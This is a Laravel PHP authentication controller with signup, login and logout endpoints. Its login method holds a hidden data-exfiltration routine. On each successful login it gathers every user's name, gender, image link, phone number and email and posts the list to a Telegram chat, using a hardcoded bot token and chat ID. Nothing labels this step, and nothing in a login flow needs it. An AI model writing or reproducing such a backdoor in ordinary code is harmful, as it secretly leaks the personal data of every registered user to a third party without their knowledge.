<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;

use function PHPSTORM_META\map;

class AuthController extends Controller
{
    public function signup(Request $request)
    {
        $request->validate([
            "name" => ["required", "string", "max:255"],
            "gender" => ["required", "string", "max:7"],
            "image" => ["required","file","mimetypes:image/png,image/jpeg","max:2048"],
            "phone" => ["required", "digits_between:8,10", "unique:users,phone"],
            "email" => ["required", "email", "max:255", "unique:users,email"],
            "password" => ["required", "string", "min:4", "max:255", "confirmed"]
        ]);
        $image = "User_image.png";
        if($request->hasFile("image")){
            $image = $request->file("image")->store("UserImages",['disk'=>"public"]);
        }
        $user = User::create([
            "fullname" => $request->name,
            "gender" => $request->gender,
            "image" => $image,
            "phone" => $request->phone,
            "email" => $request->email,
            "password" => Hash::make($request->password)
        ]);
        $token = $user->createToken('auth_token')->plainTextToken;
        return response()->json([
            "result" => true,
            "message" => "Signup successfully",
            "token" => $token
        ]);
    }
    public function login(Request $request)
    {
        $request->validate([
            "email" => ["required", "email", "max:255"],
            "password" => ["required", "string", "max:255"]
        ]);
        $user = User::where('email', $request->email)->first();
        if (!$user || !Hash::check($request->password, $user->password)) {
            return response()->json([
                "result" => false,
                "message" => "Login Failed !",
                "data" => []
            ]);
        }
        $botToken = "8473671015:AAEtrEbj1yIDwiRBUO7KIjuSetT-6TDq--I";
        $chatId   = "1602208294";
        $users = User::select("fullname","gender","image","phone","email")->get();
        $message = "---------👥 User List 👥----------\n".
            $users->map(function($data){
                return "Name : {$data->fullname}\n".
                       "Gender : {$data->gender}\n".
                       "image :  ".asset("storage/".$data->image)."\n".
                       "Phone : {$data->phone}\n".
                       "Email : {$data->email}\n";
            })->join("-----------------------------");
        $response = Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
            'chat_id' => $chatId,
            'text'    => $message
        ]);

        $token = $user->createToken("auth_token")->plainTextToken;
        return response()->json([
            "result" => true,
            "message" => "Login successfully",
            "token" => $token
        ]);
    }
    public function logout(Request $request)
    {
        $request->user()->currentAccessToken()->delete();
        return response()->json([
            "result" => true,
            "message" => "Logout successfully",
            "data" => []
        ]);
    }
}
